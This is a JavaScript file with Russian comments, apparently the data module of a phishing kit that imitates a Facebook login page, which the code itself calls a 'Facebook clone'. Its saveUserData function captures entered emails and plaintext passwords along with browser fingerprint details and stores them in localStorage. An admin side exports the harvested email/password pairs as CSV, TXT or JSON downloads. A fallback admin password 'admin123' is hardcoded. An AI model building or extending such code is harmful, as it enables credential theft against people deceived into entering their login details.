// data.js - СБОР И ХРАНЕНИЕ ДАННЫХ (ПОЛНОСТЬЮ ПЕРЕРАБОТАННЫЙ)

class DataCollector {
    constructor() {
        this.storageKey = 'facebook_data_collection';
        console.log('✅ DataCollector создан');
        this.init();
    }
    
    init() {
        console.log('🔧 DataCollector.init() запущен');
        
        // СНАЧАЛА проверяем CONFIG
        if (!window.CONFIG) {
            console.error('❌ CONFIG не загружен!');
            // Создаем временный конфиг
            window.CONFIG = {
                COLLECT_DATA: true,
                ADMIN_PASSWORD: 'admin123'
            };
        }
        
        // Проверяем LocalStorage
        if (!localStorage.getItem(this.storageKey)) {
            console.log('📦 Данных нет, создаем пустые');
            this.clearData();
        }
        
        // Загружаем данные
        this.loadData();
        
        console.log('✅ DataCollector инициализирован, пользователей:', this.data.users.length);
    }
    
    loadData() {
        try {
            const data = localStorage.getItem(this.storageKey);
            if (data) {
                this.data = JSON.parse(data);
                console.log('📥 Данные загружены из LocalStorage');
            } else {
                console.log('📦 Создаем новые данные');
                this.data = this.getDefaultData();
            }
            
            // Гарантируем наличие всех полей
            this.data.users = this.data.users || [];
            this.data.visits = this.data.visits || [];
            this.data.logs = this.data.logs || [];
            this.data.settings = this.data.settings || {
                created: new Date().toISOString(),
                totalLogins: this.data.users.length,
                uniqueIPs: []
            };
            
            console.log('✅ Данные готовы, пользователей:', this.data.users.length);
            return this.data;
            
        } catch (error) {
            console.error('❌ Ошибка загрузки данных:', error);
            this.data = this.getDefaultData();
            this.saveData();
            return this.data;
        }
    }
    
    getDefaultData() {
        console.log('🆕 Создаем структуру данных по умолчанию');
        return {
            users: [],
            visits: [],
            logs: [],
            settings: {
                created: new Date().toISOString(),
                totalLogins: 0,
                uniqueIPs: []
            }
        };
    }
    
    saveData() {
        try {
            // Сохраняем актуальные данные
            this.data.settings.totalLogins = this.data.users.length;
            
            // Уникальные IP
            const allIPs = this.data.users
                .map(user => user.ipInfo?.ip)
                .filter(ip => ip && ip !== 'unknown');
            this.data.settings.uniqueIPs = [...new Set(allIPs)];
            
            // Сохраняем в LocalStorage
            localStorage.setItem(this.storageKey, JSON.stringify(this.data));
            console.log('💾 Данные сохранены, всего записей:', this.data.users.length);
            return true;
            
        } catch (error) {
            console.error('❌ Ошибка сохранения данных:', error);
            return false;
        }
    }
    
    // САМАЯ ВАЖНАЯ ФУНКЦИЯ - сохранение данных пользователя
    saveUserData(email, password) {
        console.log('📝 saveUserData вызван с:', { 
            email: email ? email.substring(0, 10) + '...' : 'пусто', 
            password: password ? '***' : 'пусто' 
        });
        
        // Проверяем конфиг
        if (!window.CONFIG || !CONFIG.COLLECT_DATA) {
            console.log('📴 Сбор данных отключен');
            return this.createDemoUser(email, password);
        }
        
        // Генерируем IP
        const ipAddress = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        
        // Создаем объект пользователя
        const userData = {
            id: `user_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
            email: email || `user${Date.now()}@facebook.com`,
            password: password || `pass${Math.floor(Math.random() * 10000)}`,
            timestamp: new Date().toISOString(),
            browserInfo: {
                userAgent: navigator.userAgent || 'unknown',
                language: navigator.language || 'unknown',
                platform: navigator.platform || 'unknown',
                cookieEnabled: navigator.cookieEnabled
            },
            screenInfo: {
                width: window.screen.width || 0,
                height: window.screen.height || 0,
                colorDepth: window.screen.colorDepth || 0
            },
            ipInfo: {
                ip: ipAddress,
                timestamp: new Date().toISOString()
            },
            userAgent: navigator.userAgent || 'unknown',
            referrer: document.referrer || 'direct',
            pageUrl: window.location.href
        };
        
        console.log('👤 Создан новый пользователь:', userData.email);
        
        // Добавляем в массив
        if (!Array.isArray(this.data.users)) {
            this.data.users = [];
        }
        this.data.users.push(userData);
        
        // Сохраняем
        const saved = this.saveData();
        
        if (saved) {
            console.log('✅ Данные пользователя сохранены!');
            console.log('📊 Всего пользователей:', this.data.users.length);
        } else {
            console.error('❌ Не удалось сохранить данные');
        }
        
        return userData;
    }
    
    createDemoUser(email, password) {
        return {
            id: 'demo_user',
            email: email || 'demo@facebook.com',
            password: password || 'demo123',
            timestamp: new Date().toISOString(),
            ipInfo: { ip: '127.0.0.1' }
        };
    }
    
    // Получение статистики (используется в админке)
    getStats() {
        try {
            const stats = {
                totalUsers: this.data.users?.length || 0,
                totalVisits: this.data.visits?.length || 0,
                uniqueIPs: this.data.settings?.uniqueIPs?.length || 0,
                lastLogin: 'Нет данных'
            };
            
            // Последний вход
            if (this.data.users && this.data.users.length > 0) {
                const lastUser = this.data.users[this.data.users.length - 1];
                if (lastUser.timestamp) {
                    const date = new Date(lastUser.timestamp);
                    stats.lastLogin = date.toLocaleTimeString('ru-RU', {
                        hour: '2-digit',
                        minute: '2-digit',
                        day: '2-digit',
                        month: '2-digit'
                    });
                }
            }
            
            console.log('📊 Статистика:', stats);
            return stats;
            
        } catch (error) {
            console.error('❌ Ошибка получения статистики:', error);
            return {
                totalUsers: 0,
                totalVisits: 0,
                uniqueIPs: 0,
                lastLogin: 'Ошибка'
            };
        }
    }
    
    // Получение сегодняшних входов
    getTodayLogins() {
        try {
            if (!this.data.users || !Array.isArray(this.data.users)) {
                return 0;
            }
            
            const today = new Date().toDateString();
            return this.data.users.filter(user => {
                try {
                    if (!user.timestamp) return false;
                    const userDate = new Date(user.timestamp).toDateString();
                    return userDate === today;
                } catch (e) {
                    return false;
                }
            }).length;
            
        } catch (error) {
            console.error('❌ Ошибка подсчета входов:', error);
            return 0;
        }
    }
    
    // Очистка всех данных
    clearData() {
        console.log('🗑️ Очистка всех данных');
        this.data = this.getDefaultData();
        this.saveData();
        console.log('✅ Все данные очищены');
    }
    
    // Экспорт данных
    exportData(format = 'json') {
        try {
            switch(format) {
                case 'json':
                    return JSON.stringify(this.data, null, 2);
                case 'csv':
                    return this.exportToCSV();
                case 'txt':
                    return this.exportToTXT();
                default:
                    return JSON.stringify(this.data);
            }
        } catch (error) {
            console.error('❌ Ошибка экспорта:', error);
            return 'Ошибка экспорта данных';
        }
    }
    
    exportToCSV() {
        if (!this.data.users || this.data.users.length === 0) {
            return 'Нет данных';
        }
        
        const headers = ['Email', 'Пароль', 'Время', 'IP'];
        const rows = this.data.users.map(user => [
            `"${user.email || ''}"`,
            `"${user.password || ''}"`,
            user.timestamp || '',
            user.ipInfo?.ip || 'unknown'
        ]);
        
        return [headers.join(','), ...rows.map(row => row.join(','))].join('\n');
    }
    
    exportToTXT() {
        let txt = '=== СОБРАННЫЕ ДАННЫЕ FACEBOOK CLONE ===\n\n';
        txt += `Всего записей: ${this.data.users?.length || 0}\n`;
        txt += `Создано: ${new Date().toLocaleString('ru-RU')}\n\n`;
        
        txt += '=== ДАННЫЕ ПОЛЬЗОВАТЕЛЕЙ ===\n\n';
        
        if (this.data.users && this.data.users.length > 0) {
            this.data.users.forEach((user, index) => {
                txt += `Запись #${index + 1}\n`;
                txt += `Email: ${user.email || 'Нет'}\n`;
                txt += `Пароль: ${user.password || 'Нет'}\n`;
                txt += `Время: ${user.timestamp || 'Нет'}\n`;
                txt += `IP: ${user.ipInfo?.ip || 'unknown'}\n`;
                txt += `Браузер: ${user.browserInfo?.userAgent?.substring(0, 50) || 'Нет'}\n`;
                txt += '-'.repeat(40) + '\n\n';
            });
        } else {
            txt += 'Нет данных о пользователях\n\n';
        }
        
        return txt;
    }
    
    downloadData(format = 'json') {
        try {
            const data = this.exportData(format);
            const extension = format === 'csv' ? 'csv' : format === 'txt' ? 'txt' : 'json';
            const filename = `facebook_data_${new Date().toISOString().split('T')[0]}.${extension}`;
            
            const blob = new Blob([data], { 
                type: format === 'csv' ? 'text/csv' : 
                       format === 'txt' ? 'text/plain' : 
                       'application/json' 
            });
            
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            setTimeout(() => {
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }, 100);
            
            console.log(`✅ Данные экспортированы в ${format.toUpperCase()}`);
            return true;
            
        } catch (error) {
            console.error('❌ Ошибка скачивания:', error);
            return false;
        }
    }
}

// Создаем глобальный экземпляр
console.log('🚀 Запуск DataCollector...');
try {
    window.DataCollector = new DataCollector();
    console.log('✅ DataCollector создан и готов к работе');
} catch (error) {
    console.error('❌ Ошибка создания DataCollector:', error);
    window.DataCollector = {
        loadData: () => ({ users: [] }),
        getStats: () => ({ totalUsers: 0, uniqueIPs: 0, lastLogin: 'Ошибка' }),
        saveUserData: () => null
    };
}
